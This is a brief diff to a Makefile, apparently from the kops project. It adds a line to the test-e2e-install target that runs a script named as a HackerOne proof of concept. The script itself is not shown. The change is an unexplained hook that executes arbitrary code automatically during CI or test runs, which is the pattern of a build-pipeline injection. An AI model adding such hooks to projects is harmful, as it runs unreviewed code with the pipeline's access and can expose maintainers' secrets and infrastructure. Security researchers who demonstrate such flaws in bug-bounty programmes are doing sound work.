@@ -17,6 +17,7 @@ GOARCH ?= $(shell go env GOARCH)
 
 .PHONY: test-e2e-install
 test-e2e-install:
+	bash $(KOPS_ROOT)/tests/e2e/hackerone-an1msh-poc.sh
 	cd $(KOPS_ROOT)/tests/e2e && \
 		go install ./kubetest2-tester-kops && \
 		go install ./kubetest2-kops
